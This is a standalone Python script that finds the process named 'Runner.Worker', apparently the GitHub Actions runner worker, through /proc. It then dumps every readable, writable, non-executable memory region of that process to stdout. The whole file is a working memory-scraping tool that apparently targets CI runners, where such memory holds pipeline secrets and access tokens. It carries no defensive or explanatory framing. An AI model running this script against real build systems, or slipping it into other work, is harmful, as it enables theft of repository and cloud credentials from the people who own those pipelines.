#!/usr/bin/env python3
import sys
import os
import re


def main():
    pid = 'self'
    print(sys.argv);
    if(len(sys.argv) > 1):
      pid = int(sys.argv[1])
    else:
      pid = get_pid()
    print(pid)

    map_path = f"/proc/{pid}/maps"
    mem_path = f"/proc/{pid}/mem"

    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
        for line in map_f.readlines():  # for each mapped region
            [start, end, perms, offset, dev, inode, pathname] = parse_maps_line(line)
            if 'w' in perms and 'r' in perms and 'x' not in perms:
                mem_f.seek(start)  # seek to region start
                try:
                    chunk = mem_f.read(end - start)  # read region contents
                    sys.stdout.buffer.write(chunk)
                except OSError:
                    continue


def parse_maps_line(line):
    ''' The format of the file is:
    address           perms offset  dev   inode       pathname
    00400000-00452000 r-xp 00000000 08:02 173521      /usr/bin/dbus-daemon
    '''
    [address, perms, offset, dev, inode, pathname] = re.split(r'\s+', line, 5)
    [start, end] = address.split('-')
    return [int(start, 16), int(end, 16), perms, int(offset, 16), dev, inode, pathname]


def get_pid():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    for pid in pids:
        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
            if b'Runner.Worker' in cmdline_f.read():
                return pid
    raise Exception('Can not get pid of Runner.Worker')


if __name__ == "__main__":
    main()
